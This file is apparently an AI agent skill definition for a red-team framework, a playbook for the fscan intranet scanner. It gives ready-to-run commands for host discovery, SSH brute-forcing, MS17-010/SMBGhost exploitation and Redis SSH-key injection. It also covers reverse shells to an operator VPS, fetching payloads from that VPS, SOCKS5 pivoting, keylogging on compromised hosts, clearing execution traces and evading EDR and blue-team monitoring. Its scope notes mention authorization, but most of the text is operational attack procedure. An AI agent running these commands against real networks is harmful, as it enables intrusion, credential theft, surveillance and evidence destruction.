---
name: fscan-intranet
description: "fscan v2.2.1 comprehensive intranet scanner: alive host discovery, port/service identification, 28 weak password brute-force modules, unauthorized access detection, high-risk exploit modules (MS17-010/SMBGhost), Redis exploitation, and SOCKS5 proxying"
whenToUse: "Upon establishing internal access (jump box / WebShell / SOCKS5 tunnel) to rapidly map internal attack surfaces, uncover weak credentials, detect unauthorized access flaws, and convert raw reachability into initial compromises"
role: internal
enabled: true
---

# fscan (Comprehensive Intranet Scanning, Credential Brute-Forcing & Exploitation)

`fscan` = **Breadth-first intranet reconnaissance and exploitation**: feed it a `/24` subnet, and within minutes it surfaces active hosts, open ports, service banners, web titles,
weak credentials, unauthorized access points, and critical vulnerabilities. **Generates significant network noise**; intended strictly for intranet operations (use external scanning skills for perimeter targets).

## Division of Labor with gogo

| Metric | fscan | gogo |
| --- | --- | --- |
| Focus | Comprehensive discovery + credential brute-force + exploitation | High-concurrency mapping + precise fingerprinting + metadata extraction |
| Traffic Noise | High (Default 600 threads + automated brute-force + POC firing) | Controlled (`--opsec`, customizable thread/timeout profiles) |
| Recommended Phase | Clear targets, rapid credential hunting and vulnerability checks | Initial broad sweeps across large address ranges to gather titles & services |

**Recommended Sequence**: Run `gogo` first to map the address space and build the asset inventory -> execute `fscan` against confirmed alive targets for targeted brute-force and vulnerability scanning.

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/fscan/fscan          (v2.2.1 with local plugins)
        $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
        $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS   : http://<YOUR_VPS_IP>:9100/fscan               (Payload hosting directory from vps-reverse-shell)
```

The setup script downloads the linux/amd64 `fscan` binary. Supplement Windows and ARM binaries as needed; the local platform relies on the primary binary above.

**Deploying to Pivot Hosts / Targets** (Intranet scanning must execute from a position of network reachability):

```bash
# Direct download onto pivot host (Start VPS payload service: ~/.dsh/redteam/toolkit/vps/vps.sh serve 9100)
curl -o fscan http://<YOUR_VPS_IP>:9100/fscan && chmod +x fscan
# Or transfer via established shell sessions from the operator host
```

## Operational Discipline (Review Before Execution)

1. **Scope Boundaries**: Scan only authorized CIDRs; explicitly exclude office networks, printers, industrial control systems, and cloud metadata endpoints (`169.254.169.254`) via `-eh / -ehf`.
2. **Device Safety**: The default `-t 600` thread setting poses denial-of-service risks to legacy switches, embedded hardware, and ICS equipment. Initiate intranet scans with `-t 100 -time 3`, scaling concurrency only after validating network resilience.
3. **Reconnaissance Before Brute-Forcing**: Execute the initial pass with `-nobr -nopoc` to map the topology silently. Introduce brute-forcing only after identifying high-value targets and confirming authorization.
4. **Honeypot / EDR Avoidance**: Apply rate-limiting via `-rate` and packet caps via `-maxpkts` when active monitoring or blue team detection is suspected.
5. **Out-of-Band DNS Interactions**: Use `-dns -domain <your_dnslog_domain>`; never exfiltrate sensitive internal host data to public untrusted DNSLog services.

## Standard Operating Procedure (SOP)

```bash
# 0) Confirm current context and network routing
ip a; ip route

# 1) Alive host discovery (rapid ICMP sweep to identify active IP space)
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) Attack surface mapping (stealth mode: no brute-force, no POCs)
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web-focused enumeration: feed discovered HTTP services to fingerprinting
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) Targeted brute-forcing (post-authorization verification)
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) High-risk vulnerabilities and unauthorized access
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## CLI Reference (v2.2.1 `-help`)

**Target Specification**
```
-h  <IP|CIDR|file|domain>  Target specification (supports IP range files)
-hf <file>                 Host target list file     -eh/-ehf  Exclude host / Exclude file
-u  <URL>  -uf <file>      Single URL / URL list     -domain <domain>
```

**Port & Liveness Detection**
```
-p  21,22,80,443,3306,6379,10000-10100  Port list (defaults to ~150 common services)
-pf <file>  Port file                   -ep Exclude ports
-np         Skip ping discovery (port-only, faster)   -ao  Alive-only discovery
-nsp        Disable subnet pre-filtering             -ntp Disable supplemental TCP discovery
```

**Operating Modes**
```
-m all        Default full routine (port scan + brute-force + POCs)
-m icmp       ICMP alive check only
-m <plugin>   Execute specific plugin only, e.g. -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         Disable brute-forcing   -nopoc Disable POC firing   -noredis Disable Redis exploitation
```

**Concurrency & Throttling (OPSEC Critical)**
```
-t 600       Port scan concurrency     -time 3   Port timeout (seconds)
-mt 20       Module concurrency        -wt 5     Web request timeout
-gt 0        Global timeout (seconds)  -retry 3  Connection retries
-rate 0      Max packets per minute (0 = unlimited)   -maxpkts 0 Total packet budget cap
-num 20      POC concurrency           -icmp-rate 0.1 ICMP rate limit
```

**Credentials (Brute-Force)**
```
-user/-pwd      Single username/password pair         -userf/-pwdf  Dictionary files
-upf            User:pass pair file                   -usera/-pwda  Append multiple entries (comma/space separated)
-hash/-hashf    NTLM hash spray/collision             -sshkey       Private key file authentication
```

**Exploitation Actions**
```
-rf <pubkey>        Inject public key into Redis (writes authorized_keys for SSH access)
-rs                 Interactive Redis Shell           -rwc/-rwf/-rwp Redis write content/file/path
-rsh <ip:port>      Trigger reverse shell callback (pairs with vps-reverse-shell)
-sc <shellcode>     MS17-010 ShellCode execution
-local <plugin>     Local host plugins: systeminfo / keylogger / cleaner (run on pivot host)
-start-socks5 1080  Start SOCKS5 proxy on pivot host to expose internal network to operator
-fsh-port 4444      Forward bind shell listener port
```

**Proxying (Core Pivot Workflow)**
```
-socks5 127.0.0.1:1080                 Route through SOCKS5 (suo5 / ssh -D / frp)
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           Route through HTTP proxy
```

**Output Configuration**
```
-o result.txt    Output file path        -f txt|json|csv   Output format
-no              Do not write to disk    -silent  Quiet mode   -nocolor/-nopg Disable colors/progress bar
-lang zh|en      Interface language      -log "base,info,success" Log levels
-dns             Record DNS query logs (pairs with -domain for out-of-band checks)
-perf            Output performance profiling JSON
```

## Key Operational Scenarios

### 1. Pivoting Through SOCKS5 Tunnels (Most Common)

```bash
# Prerequisite: Active SOCKS5 tunnel (suo5-tunnel or vps-reverse-shell ssh -D)
# fscan -socks5 routes traffic directly through the pivot tunnel
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

Note: Reduce concurrency when routing through tunnels (the tunnel bandwidth is the primary bottleneck); `-t 50` is typically optimal.

### 2. Spawning SOCKS5 Proxy on Pivot Host for Local Routing

Run on the compromised pivot host (binds internal subnet 10.0.0.0/24 to VPS port 9100, then forward locally via SSH):

```bash
./fscan -start-socks5 1080      # Pivot host :1080 acts as SOCKS5 gateway
# Reverse tunnel on VPS: ssh -R 9200:127.0.0.1:1080 ubuntu@<YOUR_VPS_IP>
# Operator machine: ssh -L 1080:127.0.0.1:9200 ubuntu@<YOUR_VPS_IP>
# All local tools can now leverage -socks5 127.0.0.1:1080
```

### 3. Direct Exploitation via Unauthorized Redis

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # Inject SSH key -> login via SSH
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Spawn Redis interactive shell
./fscan -h 10.0.0.5 -p 6379 -rsh <YOUR_VPS_IP>:9000              # Trigger reverse shell to operator VPS listener
```

### 4. Post-Exploitation on Target Host

```bash
./fscan -local systeminfo        # Gather system metadata, environment vars, domain info, NICs
./fscan -local keylogger         # Record keystrokes (-keylog-output specifies target file)
./fscan -local cleaner           # Clear execution traces and logs
```

## Output Registration (Mandatory)

Parse fscan's segmented text output and register findings systematically:

```bash
# Register active hosts
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# Register discovered ports and services
redteam_asset_add  { engagement, ip, port, service, banner }   # Or associate via asset_link
# Register credentials and access sessions
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<subnet>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# Register verified vulnerabilities (must provide HTTP or service evidence)
redteam_vuln_add   { engagement, target, name: "Redis Unauthorized Access", severity: "high", evidence_ref }
```

**Discipline**: Save all raw output files from `-o` into `runs/`; terminal-only output is invalid for reporting.

## Troubleshooting

| Symptom | Resolution |
| --- | --- |
| Scan stalls / excessive latency | Remove `-np`, reduce `-t`, increase `-time`; for large ranges run `-m icmp` first |
| False positive open ports across entire range | Intermediate firewall/load balancer answering with SYN-ACK; increase `-time` and verify with `-retry` |
| ICMP sweep failures | Requires root / `CAP_NET_RAW`; run `sudo ./fscan -m icmp`, or switch to `-np` port scanning |
| Brute-force account lockouts | Test conservatively with `-usera`; verify lockout thresholds (critical on domain accounts) |
| Output character encoding issues | Set `-lang en` or export `LANG=C.UTF-8` |
| Require stealthier execution | Set `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`, add `-silent` if necessary |

## Related Skills

- `gogo-intranet`: Broad-spectrum initial attack surface mapping
- `suo5-tunnel`: Converts WebShell to SOCKS5, providing the `-socks5` ingress for fscan
- `vps-reverse-shell`: Payload hosting and `-rsh` listener infrastructure
- `webshell-toolkit`: WebShell persistence following initial foothold
